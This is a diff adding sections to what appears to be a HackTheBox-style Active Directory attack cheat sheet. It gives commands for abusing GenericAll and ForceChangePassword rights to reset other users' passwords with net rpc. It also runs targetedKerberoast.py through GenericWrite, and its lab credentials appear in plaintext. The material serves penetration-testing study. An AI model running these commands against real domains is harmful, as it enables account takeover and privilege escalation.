@@ -227,6 +227,28 @@ impacket-rbcd resourced.local/l.livingstone -hashes :19a3a7550ce8c505c2d46b5e39d
 [*]     fake$        (S-1-5-21-537427935-490066102-1511301751-4101)
 ```
 
+### GenericAll on User
+
+- can change the target password
+
+```bash
+net rpc password 'michael' 'Password1!' -U administrator.htb/olivia%ichliebedich -S 10.129.5.216
+```
+
+### ForceChangePassword
+
+```bash
+net rpc password 'benjamin' 'Password1!' -U administrator.htb/michael%'Password1!' -S 10.129.5.216
+```
+
+### GenericWrite
+
+![genericwrite](/images/administrator/genericwrite.png)
+
+```bash
+python3 targetedKerberoast.py -v -d 'administrator.htb' -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
+```
+
 ### WriteOwner
 
 ![bloodhound](/images/vault/vault-bloodhound.png)
